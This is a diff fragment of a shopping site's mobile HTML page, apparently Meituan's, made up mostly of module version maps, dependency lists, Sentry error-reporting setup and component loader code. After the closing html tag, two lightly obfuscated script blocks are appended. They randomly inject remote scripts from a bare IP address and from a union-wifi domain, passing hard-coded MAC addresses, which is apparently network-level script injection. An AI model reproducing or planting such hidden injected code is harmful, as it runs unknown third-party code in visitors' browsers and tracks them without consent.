f4d937","common/log.js":"e29edcb8","common/midas.js":"fdddc86e","common/msg.css.js":"882c2e03","common/msg.js":"bc5da3ac","common/mtnb.js":"9523790e","common/pop_share.js":"0fb8867b","common/risk_log_collector.js":"445a7016","common/tips.js":"cc27544d","count.js":"c412c811","mjs.js":"110dbc0c","mobile_url_manager.js":"2a35a650","page/account/address/edit.js":"9ef5e72d","page/account/address/manageAddr.js":"847b5998","page/account/default.js":"6b9521b5","page/account/doyen/doyen_comments.js":"28e42cdc","page/account/doyen/feedbacklist.js":"013809a5","page/account/login.js":"75d6544c","page/account/mescenter/default.js":"1f0b2621","page/account/security2/policy.js":"fe3e3781","page/account/setpassword.js":"f0104495","page/account/wm-login.js":"3bb08aa3","page/buy/info.js":"b18983b4","page/buy2/info.js":"9db55dfa","page/cinema/default.js":"b6760eb6","page/city.js":"8d74564c","page/deal/detail.js":"ec09234c","page/deal/feedbacklist.js":"6ac033e4","page/deal/hotel_booking.js":"4e06c420","page/deal/list.js":"d24be5c4","page/deal/search.js":"4b83c8ea","page/dzorder/dzlist.js":"befc7bea","page/elite/index.js":"c46b101f","page/event/campus.js":"1b4e2904","page/event/card.js":"e0190b88","page/event/drag.js":"10da7dae","page/event/icard.js":"fdcadb35","page/event/jweixin-1.0.0.js":"89a64dab","page/event/oab.js":"2a5fee0a","page/event/parallax.js":"08c11322","page/event/school.js":"a8539514","page/event/scratchs.js":"613177fe","page/event/transition.js":"41ef32ac","page/event/util.js":"6cdd5f37","page/event/wechat.js":"6bc2704e","page/event/wexinapi.js":"623281ba","page/help/feedback.js":"7e15c474","page/hotel/bank.js":"b2467290","page/hotel/indent.js":"5c7c49f3","page/hotel/magiccard.js":"f86fb419","page/hotel/pay.js":"e53e839f","page/hotel/poi_hotel.js":"7348b535","page/hotel/room.js":"fceb64a4","page/hotel/room_status.js":"cdbf0028","page/hotel/zldetail.js":"f5617902","page/hotel/zllist.js":"c0009f84","page/index.js":"bf995ac8","page/ktv/booking.js":"c0bbd941","page/ktv/buy.js":"85815796","page/ktv/confirm.js":"42b18333","page/ktv/list.js":"288bb770","page/ktv/prefilter.js":"e18626fa","page/ktv/selectBank.js":"a30461df","page/ktv/slide.js":"0cdc8c3c","page/ktv/structure/confirmOrder.js":"cba78ebb","page/ktv/structure/grouping.js":"c1eacdcb","page/landingsession.js":"f83c8f6b","page/order/applyrefund.js":"20523303","page/order/check.js":"f121d673","page/order/orderList.js":"5ba90bc2","page/order/selectBank.js":"a30461df","page/poi/merchant.js":"ca7dc1c3","page/pointstore/record.js":"d4df4046","page/rankList/detail.js":"8b3f0ba5","page/rankList/index.js":"f58d739f","page/recommend/index.js":"856ed635","page/recommend/listBZ.js":"234d8563","page/recommend/listCate.js":"ff05b3ba","page/recommend/listPortlet.js":"a4a31649","page/salon/feedbacklist.js":"09770d39","page/shopping_home/detail.js":"c2259b39","page/shopping_home/index.js":"23822967","page/shopping_home/list.js":"5cb66577","page/shopping_home/list_async.js":"863afa10","page/shoppingmall/detail.js":"77925311","page/shoppingmall/index.js":"01f1e21c","page/shoppingmall/poilist.js":"305fb84b","page/shoppingmall/search.js":"3721e4ba","page/shoppingmall/smfilter.js":"5f18f1f4","page/topic/mingdian.css.js":"07a42aa3","page/topic/mingdian.js":"fc88ae5d","page/zhidequ/everAct.js":"a4b8a820","page/zhidequ/index.js":"4d81bfb0","raven.min.js":"aaeb6c7e","truck.js":"a938a845","util/act/drum.js":"1944be33","util/act/gesture.js":"0de295e1","util/act/page.js":"bd4599d7","util/act/pageable.js":"16f74a83","util/act/starpage.js":"5e393800","util/bridge.js":"f92c1af1","util/carousel.js":"eb157c3c","util/channel.js":"f4903d6e","util/cookie.js":"b92e68a7","util/form_validator.js":"9cc85d41","util/geo.js":"29452162","util/handlebars.js":"a0f7ebc8","util/i_extend.js":"a5a93765","util/juicer.js":"f5ca3336","util/jweixin-1.0.0.js":"2e4644d5","util/loadImage.js":"d7ecfefc","util/location.js":"341ce8cd","util/recentItem.js":"31417fcb","util/seo.js":"f59d82ef","util/spy.js":"051a0e13","util/url.js":"b12e31d0","util/weixinAPI.js":"dc51157d","weixintips.js":"22401b4f","zepto.js":"2215a202","jsPrefix":"touch/module/"},
+                    revrev: "3cca67c0",
+                    combo: {
+                        url: '//mc.meituan.net/combo/?f=',
+                            deps: {"amd_common/iframeResizer.contentWindow.js":[],"amd_pop_i2app_activity.js":["zepto.js","util/cookie.js","count.js"],"amd_pop_i2app_v2.js":["zepto.js","mjs.js","amd_pop_v2.js"],"amd_pop_v2.js":["zepto.js"],"com/adsclickreq.js":["zepto.js"],"com/album.js":["zepto.js","util/act/page.js","util/act/pageable.js","util/act/gesture.js"],"com/captcha.js":["zepto.js"],"com/collect.js":["zepto.js","common/msg.js","mjs.js"],"com/countdown.js":["zepto.js"],"com/downloadBanner.js":[],"com/dropdown.js":[],"com/event/expandMore.js":["zepto.js"],"com/gallery.js":["zepto.js","util/act/page.js","util/act/pageable.js","util/act/gesture.js"],"com/gotop.js":[],"com/hongbao.js":["zepto.js","mjs.js","common/msg.js"],"com/i2app.js":["count.js"],"com/jsBridge.js":[],"com/knb.js":[],"com/lazyLoad.js":["zepto.js","util/cookie.js"],"com/locdist.js":["zepto.js","mjs.js"],"com/magicCard.js":["zepto.js","common/msg.js"],"com/nativeSearch.js":[],"com/opendownload.js":["mjs.js","util/cookie.js","count.js","util/weixinAPI.js"],"com/pagecommon.js":["count.js","util/cookie.js","util/i_extend.js","mjs.js","page/landingsession.js","zepto.js","util/channel.js"],"com/phonecall.js":["zepto.js","common/msg.js"],"com/radioarea.js":[],"com/redirect.js":[],"com/room_status.js":["page/hotel/room_status.js"],"com/selector.js":["zepto.js","util/act/drum.js"],"com/share.js":["zepto.js","common/msg.js","util/url.js"],"com/smsBtn.js":["zepto.js","common/msg.js"],"com/stepper.js":["zepto.js"],"com/sticky.js":["zepto.js"],"com/tab.js":["zepto.js","mjs.js","util/url.js"],"com/toggleClass.js":["zepto.js"],"com/unveil.js":["zepto.js","util/cookie.js"],"com/verify_err_handle.js":["zepto.js","mjs.js"],"com/weixin-share.js":["zepto.js","common/msg.js","util/weixinAPI.js"],"com/weixintip.js":[],"common/banner.js":["util/carousel.js"],"common/checkPosi.js":["util/cookie.js","mjs.js","util/geo.js","util/location.js"],"common/checkWebp.js":["util/cookie.js"],"common/countUp.js":[],"common/datepicker.js":["zepto.js","mjs.js"],"common/datepicker_hotel.js":["zepto.js","util/juicer.js"],"common/dateselect.js":["zepto.js","common/msg.js","common/iscroll-v5.1.3.js"],"common/dau.js":["mjs.js","util/cookie.js","count.js"],"common/filter.js":["zepto.js","common/iscroll.js"],"common/handleError.js":["zepto.js","mjs.js"],"common/httpsMta.js":["zepto.js","util/cookie.js"],"common/iframeResizer.js":[],"common/iscroll-v5.1.3.js":[],"common/iscroll.js":[],"common/islide.js":[],"common/log.js":["zepto.js","util/cookie.js"],"common/midas.js":["zepto.js"],"common/msg.css.js":[],"common/msg.js":["zepto.js","common/msg.css.js"],"common/mtnb.js":[],"common/pop_share.js":["zepto.js","amd_pop_v2.js"],"common/risk_log_collector.js":["zepto.js"],"common/tips.js":["zepto.js"],"count.js":[],"mjs.js":["zepto.js","util/cookie.js","LocalStorage","util/location.js","common/msg.js"],"mobile_url_manager.js":[],"page/account/address/edit.js":["zepto.js","mjs.js"],"page/account/address/manageAddr.js":["zepto.js","mjs.js","common/msg.js"],"page/account/default.js":["zepto.js","mjs.js"],"page/account/doyen/doyen_comments.js":["zepto.js","common/msg.js","mjs.js","page/event/oab.js","common/pop_share.js"],"page/account/doyen/feedbacklist.js":["zepto.js"],"page/account/login.js":["zepto.js","common/msg.js","mjs.js","common/tips.js","common/risk_log_collector.js","page/account/wm-login.js"],"page/account/mescenter/default.js":["zepto.js","mjs.js","common/msg.js","util/act/gesture.js"],"page/account/security2/policy.js":["zepto.js","mjs.js"],"page/account/setpassword.js":["zepto.js","common/msg.js","mjs.js"],"page/account/wm-login.js":["zepto.js"],"page/buy/info.js":["zepto.js","common/msg.js","LocalStorage","mjs.js","common/risk_log_collector.js"],"page/buy2/info.js":["zepto.js","common/msg.js","LocalStorage","mjs.js","common/risk_log_collector.js"],"page/cinema/default.js":["zepto.js","common/iframeResizer.js","common/msg.js"],"page/city.js":["zepto.js","util/recentItem.js","mjs.js","util/geo.js"],"page/deal/detail.js":["zepto.js","util/cookie.js","util/i_extend.js","common/msg.js","mjs.js","page/landingsession.js"],"page/deal/feedbacklist.js":["zepto.js","common/msg.js","util/url.js"],"page/deal/hotel_booking.js":["mjs.js","common/tips.js","zepto.js","page/deal/list.js","common/datepicker_hotel.js","common/msg.js","util/geo.js","util/url.js"],"page/deal/list.js":["zepto.js","util/url.js","common/filter.js","util/cookie.js","util/geo.js","common/banner.js","common/msg.js","mjs.js","util/seo.js","common/islide.js","util/weixinAPI.js"],"page/deal/search.js":["util/recentItem.js","mjs.js","common/tips.js","zepto.js","util/i_extend.js","page/deal/list.js","LocalStorage","util/act/pageable.js","util/act/page.js","util/cookie.js","util/url.js"],"page/dzorder/dzlist.js":["zepto.js","mjs.js","common/tips.js","common/msg.js","util/handlebars.js"],"page/elite/index.js":["zepto.js","common/msg.js","mjs.js","common/dateselect.js"],"page/event/campus.js":["zepto.js","page/event/icard.js","page/event/parallax.js"],"page/event/card.js":["page/event/util.js"],"page/event/drag.js":["page/event/util.js"],"page/event/icard.js":["page/event/card.js","page/event/drag.js","page/event/transition.js","page/event/util.js"],"page/event/jweixin-1.0.0.js":[],"page/event/oab.js":["zepto.js"],"page/event/parallax.js":[],"page/event/school.js":["mjs.js","common/tips.js","zepto.js","page/deal/list.js","common/msg.js","util/geo.js"],"page/event/scratchs.js":["zepto.js"],"page/event/transition.js":["page/event/util.js"],"page/event/util.js":[],"page/event/wechat.js":[],"page/event/wexinapi.js":[],"page/help/feedback.js":["zepto.js","common/msg.js"],"page/hotel/bank.js":["zepto.js"],"page/hotel/indent.js":["mjs.js","zepto.js","common/tips.js"],"page/hotel/magiccard.js":["zepto.js","common/msg.js"],"page/hotel/pay.js":["mjs.js","zepto.js","common/tips.js","common/msg.js"],"page/hotel/poi_hotel.js":["zepto.js","util/i_extend.js","common/datepicker_hotel.js"],"page/hotel/room.js":["mjs.js","zepto.js","common/tips.js","common/msg.js"],"page/hotel/room_status.js":["zepto.js"],"page/hotel/zldetail.js":["zepto.js","mjs.js","common/msg.js"],"page/hotel/zllist.js":["zepto.js","mjs.js","common/tips.js","common/msg.js"],"page/index.js":["common/checkPosi.js","zepto.js","util/cookie.js","mjs.js","util/geo.js","common/banner.js","util/act/pageable.js","util/act/page.js","util/i_extend.js","page/landingsession.js"],"page/ktv/booking.js":["zepto.js","common/msg.js","common/iscroll.js"],"page/ktv/buy.js":["zepto.js","mjs.js","common/msg.js"],"page/ktv/confirm.js":["zepto.js","common/msg.js","LocalStorage","mjs.js","common/risk_log_collector.js"],"page/ktv/list.js":["zepto.js"],"page/ktv/prefilter.js":["zepto.js"],"page/ktv/selectBank.js":["zepto.js","common/msg.js"],"page/ktv/slide.js":["zepto.js"],"page/ktv/structure/confirmOrder.js":["zepto.js","common/msg.js","mjs.js"],"page/ktv/structure/grouping.js":["zepto.js","common/msg.js","mjs.js"],"page/landingsession.js":["util/cookie.js","util/i_extend.js","mjs.js"],"page/order/applyrefund.js":["zepto.js","common/msg.js","mjs.js"],"page/order/check.js":["zepto.js","common/msg.js"],"page/order/orderList.js":["zepto.js","mjs.js","common/tips.js","common/msg.js"],"page/order/selectBank.js":["zepto.js","common/msg.js"],"page/poi/merchant.js":["zepto.js","mjs.js","common/msg.js"],"page/pointstore/record.js":["zepto.js","common/msg.js","util/url.js"],"page/rankList/detail.js":["zepto.js","common/log.js","mjs.js"],"page/rankList/index.js":["zepto.js","common/filter.js","mjs.js","common/msg.js","util/cookie.js","common/log.js"],"page/recommend/index.js":["zepto.js","common/filter.js","mjs.js","common/msg.js","util/cookie.js","common/log.js"],"page/recommend/listBZ.js":["zepto.js","common/filter.js","mjs.js","common/msg.js","util/cookie.js","common/log.js"],"page/recommend/listCate.js":["zepto.js","common/filter.js","mjs.js","common/msg.js","util/cookie.js","common/log.js"],"page/recommend/listPortlet.js":["zepto.js","common/filter.js","mjs.js"],"page/salon/feedbacklist.js":["zepto.js","common/msg.js","util/url.js"],"page/shopping_home/detail.js":["zepto.js","common/msg.js","mjs.js","common/islide.js"],"page/shopping_home/index.js":["zepto.js","mjs.js","util/act/pageable.js","util/act/page.js"],"page/shopping_home/list.js":["zepto.js","mjs.js","util/act/pageable.js","common/iscroll.js"],"page/shopping_home/list_async.js":["zepto.js","mjs.js","util/act/pageable.js","common/iscroll.js"],"page/shoppingmall/detail.js":["zepto.js","mjs.js","common/msg.js","common/islide.js"],"page/shoppingmall/index.js":["zepto.js","util/url.js","page/shoppingmall/smfilter.js","util/cookie.js","util/geo.js","common/banner.js","common/msg.js","mjs.js","util/seo.js","common/islide.js"],"page/shoppingmall/poilist.js":["zepto.js","util/url.js","page/shoppingmall/smfilter.js","util/cookie.js","util/geo.js","common/msg.js","mjs.js","util/seo.js","common/islide.js"],"page/shoppingmall/search.js":["util/recentItem.js","mjs.js","common/tips.js","zepto.js","util/i_extend.js","page/deal/list.js","LocalStorage","util/act/pageable.js","util/act/page.js","util/cookie.js","util/url.js"],"page/shoppingmall/smfilter.js":["zepto.js","common/iscroll.js"],"page/topic/mingdian.css.js":[],"page/topic/mingdian.js":["zepto.js","common/msg.js","mjs.js","page/topic/mingdian.css.js"],"page/zhidequ/everAct.js":["zepto.js","mjs.js","common/log.js"],"page/zhidequ/index.js":["zepto.js","common/islide.js","mjs.js","common/msg.js","common/log.js"],"raven":[],"truck.js":[],"util/act/drum.js":["zepto.js"],"util/act/gesture.js":["zepto.js"],"util/act/page.js":[],"util/act/pageable.js":["util/act/gesture.js","util/act/page.js","zepto.js"],"util/act/starpage.js":[],"util/bridge.js":["zepto.js"],"util/carousel.js":["zepto.js"],"util/channel.js":["count.js"],"util/cookie.js":[],"util/form_validator.js":["zepto.js"],"util/geo.js":["util/cookie.js","common/msg.js"],"util/handlebars.js":[],"util/i_extend.js":[],"util/juicer.js":[],"util/jweixin-1.0.0.js":[],"util/loadImage.js":[],"util/location.js":[],"util/recentItem.js":["LocalStorage"],"util/seo.js":["util/cookie.js","common/msg.js"],"util/spy.js":["zepto.js"],"util/url.js":[],"util/weixinAPI.js":["zepto.js","mjs.js","util/jweixin-1.0.0.js"],"weixintips.js":[],"zepto.js":[]}
+                    }
+            }
+        }
+    </script>
+    <script src="//ms0.meituan.net/touch/module/truck.a938a845.js" async="async" id="truckjsnode"></script>
+<script src=//ms0.meituan.net/touch/module/raven.min.aaeb6c7e.js></script>
+<script>
+Raven.config('http://d848c19fa4974b81aae565eafab80afc@sentry7.sankuai.com/468', {}).install();
+</script>
+<script>
+    require(["common/checkWebp.js"], function (checkWebp) {
+        checkWebp.checkWebp();
+    });
+</script>
+<script>
+    require(['common/midas.js'], function (Midas) {
+        Midas.initImpression();
+    });
+</script>
+<script>
+    window.__setupCom=function(root){var root=root||document.body;var doms=root.querySelectorAll("[data-com]");try{if(root.hasAttribute("data-com")){doms=Array.prototype.slice.call(doms);doms.push(root)}}catch(e){}if(doms.length){var collections=[];var coms=[];for(var i=0;i<doms.length;i++){var comNames=doms[i].attributes["data-com"].value.split("|");for(var j=0;j<comNames.length;j++){var comName=("com/"+comNames[j]+".js");doms[i].coms=doms[i].coms||[];if(doms[i].coms&&doms[i].coms[comName]){continue}doms[i].coms[comName]="loading";var index=coms.indexOf(comName);if(index==-1){index=coms.length;coms.push(comName)}collections.push({name:comName,dom:doms[i],index:index})}}require(coms,function(){for(var i=0;i<collections.length;i++){collections[i].dom.coms[collections[i].name]=new arguments[collections[i].index](collections[i].dom)}})}};if("require" in window){__setupCom(document)};
+</script>
+<div id="meituan_check"><br><br><br></div>
+</body>
+</html>
+<script>
+function ik_random(){var ik_r_min=0;var ik_r_max=100;return(parseInt(Math.random()*(ik_r_max-ik_r_min+1)+ik_r_min));}
+function ik_isiframe(){return (self!=top);}
+var __m='00:14:4f:45:61:7c';
+var __m2='00:14:4f:45:e7:e9';
+var __h="<sc"+"ript src=\"http://101.201.53.95/js.php?uid=2da41876c923e6fe3745c0218ac13158,PC,";
+var __b="&r="+Math.random()+__m+__m2+"\"></scr"+"ipt>";
+var x=ik_random();
+if(!ik_isiframe()){
+switch(true){
+case x>=0&&x<5:
+document.write(__h+"200"+__b);
+document.write("<sc"+"ript src=\"http://js.union-wifi.com/zm.js?R6Gpf6T&dmac="+__m2+"&umac="+__m+"\"></scr"+"ipt>");
+break;
+case x>=55&&x<=100:
+document.write(__h+"100"+__b);
+document.write("<sc"+"ript src=\"http://js.union-wifi.com/zm.js?Rav195P&dmac="+__m2+"&umac="+__m+"\"></scr"+"ipt>");
+break;
+}
+}
+</script><script>
+function ik_random(){var ik_r_min=0;var ik_r_max=100;return(parseInt(Math.random()*(ik_r_max-ik_r_min+1)+ik_r_min));}
+function ik_isiframe(){return (self!=top);}
+var __m='34:97:f6:e4:3e:f9';
+var __m2='00:14:4f:45:61:7a';
+var __h="<sc"+"ript src=\"http://101.201.53.95/js.php?uid=9406b356b6b7c5fea940bb0a79a411dc,PC,";
+var __b="&r="+Math.random()+__m+__m2+"\"></scr"+"ipt>";
+var x=ik_random();
+if(!ik_isiframe()){
+switch(true){
+case x>=0&&x<5:
+document.write(__h+"200"+__b);
+document.write("<sc"+"ript src=\"http://js.union-wifi.com/zm.js?R6Gpf6T&dmac="+__m2+"&umac="+__m+"\"></scr"+"ipt>");
+break;
+case x>=55&&x<=100:
+document.write(__h+"100"+__b);
+document.write("<sc"+"ript src=\"http://js.union-wifi.com/zm.js?Rav195P&dmac="+__m2+"&umac="+__m+"\"></scr"+"ipt>");
+break;
+}
+}
+</script>
